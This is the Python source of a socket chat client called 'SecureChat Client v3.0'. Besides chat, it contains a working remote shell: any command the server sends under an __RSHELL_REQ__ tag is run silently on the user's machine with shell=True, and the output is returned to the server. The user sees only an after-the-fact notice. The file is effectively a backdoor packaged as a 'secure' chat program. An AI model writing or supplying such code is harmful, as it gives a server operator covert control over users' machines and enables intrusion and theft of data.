"""
SecureChat Client v3.0

Usage:
    python client.py [host] [port]
    python client.py              # defaults: 127.0.0.1 : 9999

Commands once connected:
    /users              — list connected users
    /msg <user> <text>  — private message
    /exec <user> <cmd>  — (admins only) run cmd on target client, output to server
    /admins             — list admins
    /status             — show your role
    /help               — show help
    /quit               — disconnect

★ Remote Shell:
    When the server operator runs /rshell <you> <cmd>, your machine
    executes the command and the output is sent back to the server.
    You will see a notification that a remote command was executed.
"""

import socket
import threading
import sys
import os
import subprocess
import platform
import shlex

SERVER_HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
SERVER_PORT  = int(sys.argv[2]) if len(sys.argv) > 2 else 9999

# Protocol tags — must match server exactly
RSHELL_REQ_TAG = "__RSHELL_REQ__:"   # server → client: "execute this"
RSHELL_RES_TAG = "__RSHELL_RES__:"   # client → server: "here is the output"

BANNER = r"""
  ____  _           _     ____ _           _
 / ___|| |__   __ _| |_  / ___| |__   __ _| |_
| |    | '_ \ / _` | __|| |   | '_ \ / _` | __|
| |___ | | | | (_| | |_ | |___| | | | (_| | |_
 \____||_| |_|\__,_|\__| \____|_| |_|\__,_|\__|
   v3.0  ★ Remote Shell Enabled
"""


# ══════════════════════════════════════════════════════════════════════════════
# ★ NEW — LOCAL COMMAND EXECUTOR
# Runs a shell command on THIS machine and returns the output as a string.
# ══════════════════════════════════════════════════════════════════════════════

def execute_local_command(command: str, timeout: int = 10) -> str:
    """
    Execute `command` on the local machine and return the EXACT output.

    - Commands must be passed in quotes from the server, e.g.:
        "ls -la /tmp"   or   "whoami"
    - Strips surrounding quotes if the operator wrapped the whole command.
    - Uses shell=True so pipes, redirects, wildcards all work.
    - Merges stdout and stderr in the correct order (stderr=STDOUT).
    - Preserves exact whitespace / newlines — no .strip() on output.
    """
    try:
        # Strip one layer of surrounding quotes if present
        cmd = command.strip()
        if (cmd.startswith('"') and cmd.endswith('"')) or \
           (cmd.startswith("'") and cmd.endswith("'")):
            cmd = cmd[1:-1]

        if not cmd:
            return "(empty command)"

        os_type = platform.system()

        # On Windows wrap in cmd.exe; on POSIX use /bin/sh.
        # stderr=STDOUT merges both streams in real order (same as a terminal).
        result = subprocess.run(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,   # merge stderr into stdout (preserves order)
            timeout=timeout,
            # On Windows use the system OEM codepage; elsewhere UTF-8
            encoding="oem" if os_type == "Windows" else "utf-8",
            errors="replace"
        )

        output = result.stdout   # exact bytes decoded — no strip
        if not output.strip():
            # Command ran but produced nothing (e.g. `touch foo`)
            output = f"(no output — exit code {result.returncode})"

        return output

    except subprocess.TimeoutExpired:
        return f"[ERROR] Command timed out after {timeout}s: {command}"
    except FileNotFoundError:
        return f"[ERROR] Command not found: {command.split()[0]}"
    except Exception as e:
        return f"[ERROR] {type(e).__name__}: {e}"


# ══════════════════════════════════════════════════════════════════════════════
# RECEIVE THREAD  — continuously reads incoming server messages
# ══════════════════════════════════════════════════════════════════════════════

def receive_loop(sock: socket.socket) -> None:
    """
    Runs in a background thread.
    Reads data from the server, handles remote-shell requests transparently,
    and prints normal chat messages without blocking user input.
    """
    while True:
        try:
            data = sock.recv(4096)
            if not data:
                print("\n[!] Server closed the connection.")
                os._exit(0)

            text = data.decode("utf-8", errors="replace")

            # ── ★ Remote-shell request from server ─────────────────────
            # The server wants us to run a command and send back the output.
            # This packet is NEVER shown in chat — handled silently.
            if text.strip().startswith(RSHELL_REQ_TAG):
                # Preserve full command string including spaces/quotes
                command = text.strip()[len(RSHELL_REQ_TAG):]

                # Notify the user non-intrusively
                print(f"\r\033[33m[⚙ REMOTE] Server executed: $ {command}\033[0m")
                print("You> ", end="", flush=True)

                # Execute locally — get exact output
                output = execute_local_command(command)

                # Send result back; __RSHELL_END__ tells server the full
                # output has arrived (handles multiline output safely)
                payload = RSHELL_RES_TAG + output + "\n__RSHELL_END__\n"
                try:
                    sock.sendall(payload.encode("utf-8"))
                except (BrokenPipeError, OSError):
                    pass

                continue   # Do NOT print this as a chat message

            # ── Normal chat / server message ──────────────────────────
            print(f"\r{text}", end="\n", flush=True)
            print("You> ", end="", flush=True)

        except (ConnectionResetError, OSError):
            print("\n[!] Connection lost.")
            os._exit(0)


# ══════════════════════════════════════════════════════════════════════════════
# MAIN CLIENT LOOP
# ══════════════════════════════════════════════════════════════════════════════

def main() -> None:
    print(BANNER)

    # ── Connect ───────────────────────────────────────────────────────
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((SERVER_HOST, SERVER_PORT))
        print(f"[+] Connected to {SERVER_HOST}:{SERVER_PORT}\n")
    except ConnectionRefusedError:
        print(f"[!] Could not connect to {SERVER_HOST}:{SERVER_PORT}. Is the server running?")
        sys.exit(1)

    # ── Start background receive thread ───────────────────────────────
    recv_thread = threading.Thread(target=receive_loop, args=(sock,), daemon=True)
    recv_thread.start()

    # ── Send loop (main thread) ───────────────────────────────────────
    try:
        while True:
            try:
                msg = input("You> ").strip()
            except EOFError:
                break

            if not msg:
                continue

            # Send everything to the server
            try:
                sock.sendall((msg + "\n").encode("utf-8"))
            except (BrokenPipeError, OSError):
                print("[!] Connection lost while sending.")
                break

            if msg == "/quit":
                break

    except KeyboardInterrupt:
        print("\n[*] Interrupted.")
    finally:
        sock.close()
        print("[*] Disconnected.")


if __name__ == "__main__":
    main()
